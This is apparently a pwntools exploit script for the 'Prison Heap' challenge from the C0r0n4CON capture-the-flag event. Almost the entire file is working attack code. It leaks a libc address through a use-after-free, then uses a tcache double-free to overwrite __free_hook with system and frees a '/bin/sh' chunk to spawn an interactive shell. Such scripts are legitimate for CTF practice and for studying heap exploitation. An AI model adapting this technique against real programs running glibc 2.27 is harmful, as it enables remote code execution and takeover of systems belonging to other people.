from pwn import *

# --- Info ---
# CTF: C0r0n4CON
# Date: -
# Challenge: Prison Heap
# Description: Leak libc with Use-After-Free (UAF) and get shell with tcache poisoning
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './prison_heap'
LIBC = './libc-2.27.so'
ENV = {"LD_PRELOAD":"./libc-2.27.so"}
libc  = ELF(LIBC, checksec = False)

REMOTE = 0

HOST = ''
PORT = 0

def alloc(size, data):
    r.recvuntil('Exit\n')
    r.sendline('1')
    r.recvuntil('prison heap\n')
    r.sendline(str(int(size)))
    r.recvuntil('the prison\n')
    r.sendline(data)
    r.recvuntil('COVID-19\n')
    
def free(idx, shell = False):
    r.recvuntil('Exit\n')
    r.sendline('2')
    r.recvuntil('for free\n')
    r.sendline(str(int(idx)))
    if(shell):
        return
    r.recvuntil('COVID-19\n')

def show(idx):
    r.recvuntil('Exit\n')
    r.sendline('3')
    r.recvuntil('for read\n')
    r.sendline(str(int(idx)))
    data = r.recvuntil('\nChoose')
    data = data.replace('\nChoose', '')
    return data
    
def close():
    r.recvuntil('Exit\n')
    r.sendline('4')
    r.recvuntil('<0>\n')
    r.close()

def pad(addr):
    return addr + '\x00'*(8-len(addr))
    
context.binary = PATH
r = remote(HOST, PORT) if REMOTE else process(PATH, env=ENV)
OFFSET_LEAK = 0x3ebca0

#gdb.attach(r)

alloc(512, "")  # 0
alloc(0x10, "/bin/sh\x00") # 1 (avoid it getting added to top chunk)

for _ in range(7):
    free(0)
free(0) # unsorted bin

leak = u64(pad(show(0)))

libc.address = leak - OFFSET_LEAK
one_gadget = libc.address + 0x4f2c5

log.info(f'Leaked: main_arena @ {hex(leak)}')
log.info(f'Leaked: libc base @ {hex(libc.address)}')
log.info('Leaked: system @ ' + hex(libc.symbols['system']))
log.info('Leaked: __free_hook @ ' + hex(libc.symbols['__free_hook']))
log.info(f'Leaked: one_gadget @ {hex(one_gadget)}')

# tcache poisoning

alloc(0x40, "AAAA") # 2

free(2)

# tcache -> ptr1

free(2)

# tcache -> ptr1 -> ptr1

alloc(0x40, p64(libc.symbols['__free_hook'])) # 3

# tcache -> ptr1 -> __free_hook

alloc(0x40, "AAAA") # 4

# tcache -> __free_hook

alloc(0x40, p64(libc.symbols['system'])) # __free_hook overwrite (with system)

#pause()

free(1, True) # free("/bin/sh\x00")

r.interactive()
r.close()
